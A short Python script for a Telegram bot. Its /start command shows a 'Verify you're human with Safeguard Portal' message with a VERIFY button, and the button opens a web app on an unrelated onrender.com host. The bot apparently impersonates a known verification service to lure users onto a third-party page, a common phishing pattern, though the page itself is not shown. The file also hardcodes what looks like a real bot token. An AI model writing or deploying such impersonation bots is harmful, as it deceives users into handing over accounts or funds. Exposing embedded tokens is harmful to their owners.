
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, InputMediaPhoto
from telegram.ext import Application, CommandHandler

# Replace with your bot token
TOKEN = '7805189662:AAECZeDOqK5luNZOb__V-43aaLwnGJ4QkrY'

# Define the /start command handler
async def start(update: Update, context) -> None:
    chat_id = update.message.chat_id

    # Create the verification button
    keyboard = [
        [InlineKeyboardButton("VERIFY", web_app=WebAppInfo(url="https://pump-1k15.onrender.com/verify"))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Send the styled message with an image
    await context.bot.send_photo(
        chat_id=chat_id,
        photo="https://i.ibb.co/Yhfp1Ss/2024-10-13-08-39-28.jpg",  # Replace with the URL of the image you want to display
        caption=(
            "<b>Verify you're human with Safeguard Portal</b>\n\n"
            "Click 'VERIFY' and complete captcha to gain entry.\n"
            "<a href='https://your-help-link.com'>Not working?</a>"
        ),
        parse_mode="HTML",
        reply_markup=reply_markup
    )

# Main function to run the bot
def main():
    # Create the Application object
    application = Application.builder().token(TOKEN).build()

    # Add a handler for the /start command
    application.add_handler(CommandHandler("start", start))

    # Start polling the bot and keep it running
    application.run_polling()

if __name__ == '__main__':
    main()
